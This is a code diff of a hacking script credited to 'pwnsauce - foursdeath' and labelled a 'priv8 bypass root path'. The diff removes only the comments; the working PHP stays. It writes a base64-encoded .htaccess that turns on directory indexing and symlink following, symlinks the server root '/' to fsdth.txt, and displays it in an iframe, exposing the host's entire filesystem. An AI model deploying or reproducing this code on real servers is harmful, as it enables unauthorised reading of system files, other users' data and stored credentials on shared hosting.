@@ -1,5 +1,3 @@
-<!--priv8 bypass root path decoded & recoded by pwnsauce - foursdeath-->
-<!--fck u-->
 <style type="text/css">body {background-color: #151515; font-family:Courier	
 margin-left: 0px; margin-top: 0px; text-align: center;</style>
 <br /><br /><body><tr><td>
@@ -11,4 +9,3 @@ $x = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaH
 $y = fopen(".htaccess","w+"); $write = fwrite ($y ,base64_decode($x)); $fsdth = symlink("/","fsdth.txt"); 
 $z = "<br><a href=fsdth.txt TARGET='_blank'></a><br><br><iframe src='fsdth.txt' width='800' height='500'></iframe>"; 
 echo "<br>$z</center>";} echo "</form>";  ?></td></tr></body></html>
-<!--end-->
